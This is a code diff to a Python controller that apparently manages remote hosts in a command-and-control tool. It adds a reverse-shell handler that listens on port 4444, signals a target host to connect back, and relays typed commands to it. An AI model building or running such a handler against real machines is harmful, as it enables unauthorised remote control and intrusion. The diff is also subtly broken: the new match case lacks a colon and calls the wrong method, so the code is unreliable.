@@ -11,6 +11,7 @@ from termcolor import colored
 import sys
 import time
 import argparse
+import socket
 import readline
 from multiprocessing import Process, Manager
 
@@ -71,7 +72,30 @@ class Controller(Host):
         else:
             print(f"{shellpack['data'].decode()}")
             shell_lock.value = False
-        
+    
+    def reverse(self, target):
+        Target = Query()
+        target = self.db.search(Target.id == target)[0]
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("0.0.0.0", 4444))
+        s.listen(1)
+        self.send(target['ip'], "reverse")
+        conn, addr = s.accept()
+        print('Connection received from ',addr)
+
+        while True:
+            #Receive data from the target and get user input
+            ans = conn.recv(1024).decode()
+            sys.stdout.write(ans)
+            command = input()
+
+            #Send command
+            command += "\n"
+            conn.send(command.encode())
+            time.sleep(1)
+
+            #Remove the output of the "input()" function
+            sys.stdout.write("\033[A" + ans.split("\n")[-1])
 
 if __name__ == "__main__":
     controller = Controller()
@@ -81,6 +105,8 @@ if __name__ == "__main__":
         case "ls":
             print(controller.list_hosts())
         case "interact":
+            controller.interact(int(sys.argv[2]))
+        case "reverse"
             controller.interact(int(sys.argv[2]))
 
             
